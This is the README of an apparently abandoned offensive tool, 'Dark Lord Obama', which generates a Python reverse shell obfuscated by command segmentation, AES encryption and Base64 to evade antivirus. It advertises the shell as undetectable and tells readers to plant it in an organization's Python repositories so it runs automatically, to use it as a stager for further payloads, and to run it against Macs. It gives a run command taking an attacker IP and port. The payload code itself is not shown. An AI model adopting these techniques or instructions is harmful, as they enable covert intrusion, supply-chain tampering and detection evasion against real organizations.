# Dark Lord Obama will now be transitioned into Google Golang

The Python 2 to 3 transition was a clusterfuck, a atomic blast of breakage. [](https://lwn.net/Articles/843660/)

It pisses me off, because my code worked PERFECTLY. But now PyPi won't properly install dependencies required for this to work. Even manually installing PyCrypto will through errors.

And I am not a big fan of half-assed hacks to fix things that should have been supported via some sort of compatibility.

Everyone, please move on along to the successor of DarkLordObama, EXOCET-Antivirus-Evasion. [](https://github.com/tanc7/EXOCET-AV-Evasion)


![](https://xringarchery.files.wordpress.com/2019/07/obama-sith-lord.jpg)

# Dark Lord Obama - Undetectable Pythonic Payload Generator

Chang Tan Lister
Lister Unlimited Cybersecurity Solutions, LLC.
changtan@listerunlimited.com

![](https://xringarchery.files.wordpress.com/2019/07/a_undetectable_payload1.png)

DLO generates a Pythonic reverse shell that as of July 29th, 2019, is undetectable on VirusTotal. It combines multiple won't-to-be-disclosed techniques (undiscloseable in detail) including but not limited to:

1. "Command Segmentation"
2. "AES Encryption" with a 32-bit key and a 16-bit initialization vector
3. Base64 Encoding - It was a necessity
4. Inline Python exec() functions, C asm() functions (will be added soon), Java/Jython, Cython, Ctypes

# Dark Lord Obama Official Release Demo

*Please click this link for a demostration video of how to use*

<a href=https://encryptedarchives2.s3-us-west-1.amazonaws.com/darklordobamarelease.mp4>Demo Video</a>

# Suggested Uses

Currently you can, after you gain a foothold in organization

1. Run the payload standalone.
2. Replace the proof-of-concept code with a Metasploit python payload
3. Taint/corrupt Python repositories: Locate the Python code repositories of a organization during a pentest and then copy-paste the entire code and append it to the bottom of the python module, guarantee auto-execution of the reverse shell when the code runs
4. Use the payload as a stager to download additional payloads
5. Use the payload against MacOS (MacBooks, iMacs, etc). They natively run Python 2.7.1

Run it as ```python darklordobama.py <attacker IP> <attacker listening port>```

![](https://xringarchery.files.wordpress.com/2019/07/a_undetectable_payload2.png)

![](https://xringarchery.files.wordpress.com/2019/07/a_undetectable_payload5.png)

# How does it work?

# First it chops up your payload into two-character segments, "Command Segmentation)

![](https://encryptedarchives2.s3-us-west-1.amazonaws.com/Screenshot+from+2020-06-06+18-47-41.png)

# A ArrayMap is produced to allow the payload to reconstitute itself

![](https://encryptedarchives2.s3-us-west-1.amazonaws.com/Screenshot+from+2020-06-06+18-47-31.png)

# The payload is then shuffled into a list array and then encrypted with AES-128

![](https://encryptedarchives2.s3-us-west-1.amazonaws.com/Screenshot+from+2020-06-06+18-47-23.png)

# The encrypted payload is encoded in Base64 format

![](https://encryptedarchives2.s3-us-west-1.amazonaws.com/Screenshot+from+2020-06-06+18-47-14.png)

